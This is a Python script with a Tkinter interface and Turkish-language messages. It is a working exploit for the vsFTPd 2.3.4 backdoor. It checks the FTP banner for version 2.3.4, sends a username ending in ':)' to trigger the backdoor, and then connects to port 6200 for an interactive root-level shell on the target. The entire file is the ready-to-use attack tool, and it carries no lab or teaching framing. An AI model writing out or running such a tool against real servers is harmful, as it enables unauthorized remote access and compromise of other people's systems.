import tkinter as tk
from tkinter import messagebox
from pwn import *
import logging
from sys import exit
from time import sleep
import threading

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

class ExploitFTP:
    def __init__(self):
        self.ip = ""
        self.port = 0
        self.text_area = None

    def print_to_text_area(self, message):
        self.text_area.insert(tk.END, message + '\n')
        self.text_area.see(tk.END)

    def trigger_backdoor(self):
        try:
            self.print_to_text_area("[▁] Sürüm Kontrolü Yapılıyor...")

            io = remote(self.ip, self.port)
            io.recvuntil(b"vsFTPd ")
            version = (io.recvuntil(b")")[:-1]).decode()
            if version != "2.3.4":
                self.print_to_text_area("[INFO] 2.3.4 Sürümü Bulunamadı!!!")
                exit()
            else:
                self.print_to_text_area("[INFO] Geri Kapı Tetikleniyor....")
                io.sendline(b"USER hello:)")
                io.sendline(b"PASS hello123")
                sleep(1)
                io.close()
        except Exception as e:
            logger.error("Geri kapı tetikleme sırasında hata oluştu: %s" % str(e))
            messagebox.showerror("Hata", "Geri kapı tetikleme sırasında bir hata oluştu:\n%s" % str(e))
            exit()

    def get_shell(self):
        try:
            self.print_to_text_area("[INFO] Geri Kapıya Bağlanılıyor...")
            sleep(1)
            io = remote(self.ip, 6200)
            self.print_to_text_area("[INFO] Geri Kapıya Erişildi!!!")
            io.interactive()
            io.close()
        except Exception as e:
            logger.error("Geri kapıya bağlanırken hata oluştu: %s" % str(e))
            messagebox.showerror("Hata", "Geri kapıya bağlanırken bir hata oluştu:\n%s" % str(e))
            exit()

def exploit():
    exploit_obj = ExploitFTP()

    window = tk.Tk()

    def start_exploit_thread():
        exploit_obj.ip = ip_entry.get().strip()
        exploit_obj.port = int(port_entry.get().strip())

        t1 = threading.Thread(target=exploit_obj.trigger_backdoor)
        t2 = threading.Thread(target=exploit_obj.get_shell)

        t1.start()
        sleep(2)  # Bekleme süresi, tetikleme işleminden sonra geri kapıya bağlanmak için yeterli zaman sağlamak için ayarlanabilir
        t2.start()

    console_frame = tk.Frame(window)
    console_frame.pack()

    console_label = tk.Label(console_frame, text="Konsol Ekranı:")
    console_label.pack()

    text_area = tk.Text(console_frame, width=50, height=10)
    text_area.pack()

    exploit_obj.text_area = text_area

    ip_label = tk.Label(window, text="IP Adresi:")
    ip_label.pack()

    ip_entry = tk.Entry(window)
    ip_entry.pack()

    port_label = tk.Label(window, text="Port Numarası:")
    port_label.pack()

    port_entry = tk.Entry(window)
    port_entry.pack()

    exploit_button = tk.Button(window, text="Exploit", command=start_exploit_thread)
    exploit_button.pack()

    def close_window():
        if messagebox.askokcancel("Çıkış", "Exploit işlemi iptal edilecek, çıkmak istiyor musunuz?"):
            window.destroy()

    window.protocol("WM_DELETE_WINDOW", close_window)
    window.mainloop()


if __name__ == "__main__":
    exploit()

